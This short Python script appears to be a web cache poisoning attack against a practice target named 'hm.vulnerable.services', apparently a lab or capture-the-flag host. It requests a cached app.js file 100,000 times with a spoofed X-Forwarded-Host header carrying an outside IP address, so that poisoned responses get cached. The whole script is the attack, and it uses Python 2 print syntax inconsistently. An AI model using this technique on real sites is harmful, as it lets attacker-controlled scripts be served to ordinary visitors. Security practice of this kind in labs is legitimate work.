headers = {
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate",
"Connection": "keep-alive",
"Upgrade-Insecure-Requests": "1",
"Pragma": "no-cache",
"Cache-Control": "no-cache",
"X-Forwarded-Host": "86.125.27.232"
}

url = "http://app.hm.vulnerable.services/"
main = "http://app.hm.vulnerable.services/cdn/main.mst"
#app = "http://app.hm.vulnerable.services/cdn/app.js"
app = "http://e85da6da6a5ee8e9df6c88d3544a726cd8f2fd86.hm.vulnerable.services/cdn/app.js"

from requests import get, post
from time import time

start = time()
for i in range(100000):
    resp = get(app, headers = headers)
    #print (resp.text.encode('utf-8'))
    print (i)
    print time() -start
